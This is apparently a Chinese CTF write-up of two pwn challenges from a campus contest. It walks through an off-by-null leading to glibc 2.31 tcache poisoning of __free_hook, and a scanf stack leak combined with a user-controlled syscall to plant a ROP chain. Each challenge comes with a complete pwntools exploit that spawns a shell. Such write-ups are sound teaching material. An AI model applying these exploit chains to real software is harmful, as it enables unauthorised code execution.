---
title: JNCTF 9th
description: "校赛记录"
date: "2026-04-19 16:00:00"
draft: false
sticky: false
showHeroImage: false
tags: [PWN, WP]
categories: [WP]
series: []
comments: true
sidebar:
  enable: true
  toc: true
  relatedPosts: true
---


## poison

这里主要是泄露 heap 和 libc 的手法，off by null 的手法，打 tcache poison 的手法。
菜单题目， **glibc 2.31** ，功能如下：

```
1. Add a game
2. Edit a game
3. Delete a game
4. View a game
5. Exit
```

### 源码：

修了一个结构体，先放在这里，为什么要修结构体，因为避免阅读指针乱飞的代码

```c
struct game
{
    char name[32];
    int size;
    char des[];
};
```

##### 1.添加游戏：

在 `add_game()` 中有 `off-by-null` 漏洞存在。

```c
unsigned __int64 add_game()
{
  int size; // [rsp+4h] [rbp-1Ch] BYREF
  int i; // [rsp+8h] [rbp-18h]
  int v3; // [rsp+Ch] [rbp-14h]
  game *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 31 && games[i]; ++i )
    ;
  if ( i == 32 )
  {
    puts("Game list is full!");
  }
  else
  {
    printf("Description size: ");
    __isoc99_scanf("%d", &size);
    getchar();
    buf = (game *)malloc(size + 36LL);    //这里的36也就是0x24,修出的结构体的大小
    printf("Game name: ");
    read(0, buf, 0x20u);
    buf->size = size;
    printf("Description: ");
    v3 = read(0, buf->des, size);
    buf->des[v3] = 0;                     //这里存在 off-by-null
    games[i] = buf;
    puts("Game added!");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

##### 2.编辑游戏：

```c
unsigned __int64 edit_game()
{
  unsigned int v1; // [rsp+0h] [rbp-40h] BYREF
  int v2; // [rsp+4h] [rbp-3Ch]
  game *dest; // [rsp+8h] [rbp-38h]
  char s[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("Game index: ");
  __isoc99_scanf("%d", &v1);
  getchar();
  if ( v1 < 32 && games[v1] )
  {
    dest = (game *)games[v1];
    printf("New name: ");
    memset(s, 0, 32u);       // 把 Name 置零
    read(0, s, 32u);         // 读取新 Name
    s[strcspn(s, "\n")] = 0; // 返回 s[Name 长度-1] = 0
    strcpy(dest->name, s);   // 可以修改掉 size 字段的一位改成0
    printf("New description: ");
    v2 = read(0, dest->des, dest->size);
    dest->des[v2] = 0;
    puts("Game updated!");
  }
  else
  {
    puts("Invalid game index!");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

##### 3.删除游戏：

 **这里将指针置零了，不存在 UAF 漏洞。**

```c
unsigned __int64 delete_game()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Game index: ");
  __isoc99_scanf("%d", &v1);
  getchar();
  if ( v1 < 0x20 && games[v1] )
  {
    free((void *)games[v1]);
    games[v1] = 0;
    puts("Game deleted!");
  }
  else
  {
    puts("Invalid game index!");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

##### 4.查看游戏：

```c
unsigned __int64 view_game()
{
  unsigned int v1; // [rsp+Ch] [rbp-14h] BYREF
  const char *v2; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Game index: ");
  __isoc99_scanf("%d", &v1);
  getchar();
  if ( v1 < 0x20 && games[v1] )
  {
    v2 = (const char *)games[v1];
    printf("Name: %s\n", v2);
    printf("Description: %s\n", v2 + 36);
  }
  else
  {
    puts("Invalid game index!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

#### vulnerable:

在 `add_game()` 中存在 `off-by-null` 漏洞，通过对 chunk 的 `size` 字段进行 修改 ,  通过 Tcache poison 实现目标

### 利用：

#### 阶段1：泄露 Heap 与 Libc 地址

当较大的 chunk 被释放后会进入 `unsorted bin` , `unsorted bin` 中不同的 chunk 会通过 `fd` 和 `bk` 指针链接，其中包含指向 `main_arena` 的地址和堆块自身的地址。比如:

```python
add(0x500,b'A'*8,b'B'*8)    # 0
add(0x30,b'C'*8,b'D'*8)     # 1 # 小 chunk 防止前面的 chunk 与 Top chunk 合并
add(0x500,b'E'*8,b'F'*8)    # 2
add(0x30,b'G'*8,b'H'*8)     # 3
delete(0)
delete(2)
```

通过调试看到：

```
pwndbg> bins
...
unsortedbin
all: 0x62f98695a820 —▸ 0x62f98695a290 —▸ 0x7d90e327fbe0 (main_arena+96) ◂— 0x62f98695a820
...
```

再将它们申请回来可以获得 Libc 和 Heap 地址。

#### 阶段2：构造 Fake Chunk (绕过 Safe Unlink)

泄露之后自然地想到继续申请几个 chunk ，使用 `off-by-null` 来覆盖下一个 chunk 的 size 字段制造堆块重叠,   先绕过 **glibc 2.31** 的安全检查机制，要在想修改 size 位的 chunk 前伪造一个 fake chunk 。
所以需要：
在 Chunk 4 中伪造一个 `prev_size` 和一套假指针（`fd` 和 `bk` 指向伪造位置）。利用 `add_game` 的 `off-by-null` 将 Chunk 5 的 `size` 位（原本是 `0x501`）最低字节改为 `00`，并清空其 `PREV_INUSE` 标志。同时在 Chunk 5 的 `prev_size` 处填入指向 Chunk 4 伪造起始位置的大小 。

```
0x5f790d14edb0  0x0000000000000000      0x00000000000000b1
0x5f790d14edc0  0x00005f790d14edc0      0x00005f790d14edc0   假 fd 和 bk
0x5f790d14edd0  0x00005f790d14edb0      0x00005f790d14edb0   为了满足fd->bk == p
0x5f790d14ede0  0x6161616100000084      0x6161616161616161
0x5f790d14edf0  0x6161616161616161      0x6161616161616161
0x5f790d14ee00  0x6161616161616161      0x6161616161616161
0x5f790d14ee10  0x6161616161616161      0x6161616161616161
0x5f790d14ee20  0x6161616161616161      0x6161616161616161
0x5f790d14ee30  0x6161616161616161      0x6161616161616161
0x5f790d14ee40  0x6161616161616161      0x6161616161616161
0x5f790d14ee50  0x6161616161616161      0x6161616161616161
0x5f790d14ee60  0x00000000000000b0      0x0000000000000500   已经被改掉
0x5f790d14ee70  0x0000000000313035      0x0000000000000000   prev_size上一行b0
```

#### 阶段3：制造堆块重叠 Overlap

 执行 `delete(5)`。系统检查到 `PREV_INUSE` 为 0，会根据 `prev_size` 寻找上一个 空闲 块。  系统找到 Chunk 4 所在位置并完成合并。此时，Unsorted Bin 中出现了一个覆盖了原有 Chunk 4 和 Chunk 5 范围的巨大空闲块。**后果**：chunk 4 的指针仍然存在，且指向了现在处于空闲状态的内存内部。实现了类似 UAF 的效果。

#### 阶段4：Tcache Poisoning

从小切割刚才合并的大块（`add(0x20)`），拿到 chunk 5。此时 chunk 4 和 chunk 5 实际上指向同一块或极其接近的内存。释放 chunk 6 和 chunk 5 进入 Tcache。通过 `edit(4)` 修改 chunk 5 原本在 Tcache 中的 `next` 指针，将其指向 `__free_hook`。

编辑4实际上是改 chunk_5 的 next

```python
edit(4,p64(free_hook),b'aaaa')
```

可以看到确实改成功了：

```
pwndbg> bins
tcachebins
0x50 [  2]: 0x56d8f88bedc0 —▸ 0x73d7a321fe48 (__free_hook) ◂— 0
```

#### 阶段5：Getshell

连续申请两次 `0x20` 的 chunk。第二次申请将直接返回 `__free_hook` 的地址。在 `__free_hook` 处写入 `system` 函数地址。将某个 chunk 的开头写为 `/bin/sh\x00` 并对其执行 `delete` 操作。触发 `free("/bin/sh")` -> `system("/bin/sh")`，成功获取 Shell。

```python
from pwn import *
context(arch = 'amd64',log_level = 'debug',terminal=['tmux', 'new-window'])

libc = ELF("./libc-2.31.so")
elf = ELF("./pwn")

p = process("./pwn")
def add(size, name,des):
    p.sendlineafter("> ", "1")
    p.sendlineafter(b"size: ", str(size))
    p.sendafter(b"name: ", name)
    p.sendafter(b'Description: ',des)

def edit(index,name,des):
    p.sendlineafter("> ", "2")
    p.sendlineafter("index: ", str(index))
    p.sendafter(b"name: ", name)
    p.sendafter(b'description: ',des)

def view(index):
    p.sendlineafter("> ", "4")
    p.sendlineafter("index:", str(index))

def delete(index):
    p.sendlineafter("> ", "3")
    p.sendlineafter("index:", str(index))

add(0x500,b'A'*8,b'B'*8)    # 0
add(0x30,b'C'*8,b'D'*8)     # 1
add(0x500,b'E'*8,b'F'*8)    # 2
add(0x30,b'G'*8,b'H'*8)     # 3

delete(0)
delete(2)

add(0x500,b'A'*8,b'B'*8)        # 0
view(0)

p.recvuntil(b'Name: AAAAAAAA')
heap = u64(p.recv(6).ljust(8, b'\x00')) -0x820
success(f"heap: {hex(heap)}")

add(0x500,b'E'*8,b'F'*8)        # 2
view(2)
p.recvuntil(b'E'*8)
libc_base = u64(p.recv(6).ljust(8, b'\x00'))  -0x1ecbe0
success(f"libc: {hex(libc_base)}")

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

add(0x84,b'84',b'84')           # 4 0x84 -> 0xb0
add(0x500-0x30,b'501',b'501')   # 5 0x500-0x30 -> 0x500
add(0x20,b'20',b'20')           # 6

delete(4)                       #
add(0x84,p64(heap+0xdb0+0x10)*2+p64(heap+0xdb0)*2,b'a'*(0x84-8)+p64(0xb0))
# gdb.attach(p,'brva 0x1819')
delete(5)
add(0x20,b'20',b'20')           # 5
delete(6)
delete(5)
edit(4,p64(free_hook),b'aaaa')

add(0x20,b'/bin/sh\x00',b'/bin/sh\x00')     # 5
add(0x20,p64(system),b'114514')             # 6
delete(5)

p.interactive()
```

## OverLib

main里只调用了两个函数，还是在 libfunc.so 里的，于是直接逆向 libfunc.so

game 函数是程序的主体：

```c
unsigned __int64 game()
{
  int v1; // [rsp+Ch] [rbp-124h] BYREF
  unsigned int v2; // [rsp+10h] [rbp-120h] BYREF
  int i; // [rsp+14h] [rbp-11Ch]
  _QWORD v4[34]; // [rsp+18h] [rbp-118h] BYREF
  unsigned __int64 v5; // [rsp+128h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("Welcome to the challenge!");
  for ( i = 0; i <= 31; ++i )
  {
    printf("plz input the %dth cup of coin's number:", i + 1);
    __isoc99_scanf("%llu", &v4[i + 1]);
  }
  while ( 1 )
  {
    menu();
    printf("plz input your choice:");
    __isoc99_scanf("%d", &v1);
    if ( v1 == 3 )
      break;
    if ( v1 > 3 )
      goto LABEL_17;
    if ( v1 == 1 )
    {
      get_gift();
    }
    else if ( v1 == 2 )
    {
      puts("Tossing coin...");
      printf("plz input the cup index you want to toss (1-32):");
      __isoc99_scanf("%u", &v2);
      if ( v2 && v2 <= 0x20 )
      {
        printf("Please enter the number of coins to toss from cup %u: ", v2);
        __isoc99_scanf("%llu", v4);
        if ( v4[v2] >= v4[0] )
        {
          v4[v2] -= v4[0];
          puts("Coin tossed successfully!");
        }
        else
        {
          puts("Not enough coins to toss! Please try again.");
        }
      }
      else
      {
        puts("Invalid index! Please try again.");
      }
    }
    else
    {
LABEL_17:
      puts("Invalid choice! Please try again.");
    }
  }
  puts("Exiting... Goodbye!");
  return v5 - __readfsqword(0x28u);
}
```

发现是 `game()` 通过 `scanf()` 读取了 32 个 int 数据，当输入 `+` 时，由于不匹配而不会读取，也就不会覆盖掉栈上原来的数据；投硬币游戏可以泄露出这些原本在栈上的数据，比如libc



还有 `get_gift()` 和 `gift`

```c
int get_gift()
{
  _DWORD *v0; // rax

  if ( flag )
  {
    LODWORD(v0) = puts("You have already got your gift!");
  }
  else
  {
    gift();
    v0 = &flag;
    flag = 1;
  }
  return (int)v0;
}
```



```c
unsigned __int64 gift()
{
  __int64 v1; // [rsp+0h] [rbp-30h]
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Here's a gift for you:");
  printf("plz input the nr:");
  __isoc99_scanf("%llu");
  printf("plz input the arg1:");
  __isoc99_scanf("%llu");
  printf("plz input the arg2:");
  __isoc99_scanf("%llu");
  printf("plz input the arg3:");
  __isoc99_scanf("%llu");
  __asm { syscall; LINUX - }
  printf("ret=%ld\n", v1);
  return v2 - __readfsqword(0x28u);
}
```

 `gift()` 中给了一个 参数完全由我们掌控的 系统调用 我们非常喜欢的方式是直接 `execve("/bin/sh")` , 但是这里的话第二个参数似乎有些问题，于是想到 syscall 0 读取一个 rop 链到 `RBP` 的位置，这样程序退出时就会触发这个 rop 链了，rbp 的位置可以通过泄露栈地址获得。

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug',terminal = ['tmux', 'new-window'])

p = process('./pwn')
libc = ELF('./libc.so.6')

def cups():
    for i in range(32):
        p.recvuntil(b"number:")
        p.sendline(b'+')

def tos(idx):
    n = 2 << 63
    ans = 0
    for i in range(64):
        p.recvuntil(b'plz input your choice:')
        p.sendline(b'2')
        p.recvuntil("plz input the cup index you want to toss (1-32):")
        p.sendline(str(idx).encode())
        p.recvuntil(b'Please enter the number of coins to toss from cup ')
        p.recvuntil(b': ')
        p.sendline(str(n).encode())
        info = p.recvline()
        print(info)
        if b'successfully!' in info:
            ans+= n
        n >>=1
    return ans

def gift(nr, a1, a2, a3):
    p.recvuntil(b"choice:")
    p.sendline(b"1")
    p.recvuntil(b"nr:")
    p.sendline(str(nr).encode())
    p.recvuntil(b"arg1:")
    p.sendline(str(a1).encode())
    p.recvuntil(b"arg2:")
    p.sendline(str(a2).encode())
    p.recvuntil(b"arg3:")
    p.sendline(str(a3).encode())


cups()
stack_leak = tos(28)
success(hex(stack_leak))
libc_base = tos(26) -0x80faa
success(hex(libc_base))
rbp1 = stack_leak - 0xdc8 + 0x978
success(hex(rbp1))

gift(0,0,rbp1,256)

pop_rdi = libc_base + 0x2a3e5
system  = libc_base + libc.sym['system']
bin_sh  = libc_base + next(libc.search(b'/bin/sh'))
ret = libc_base+0x29139
payload = p64(pop_rdi) + p64(bin_sh) + p64(ret)+p64(system)
p.sendline(payload)
#gdb.attach(p)

p.recvuntil(b"choice:")
p.sendline(b"3")

p.interactive()
```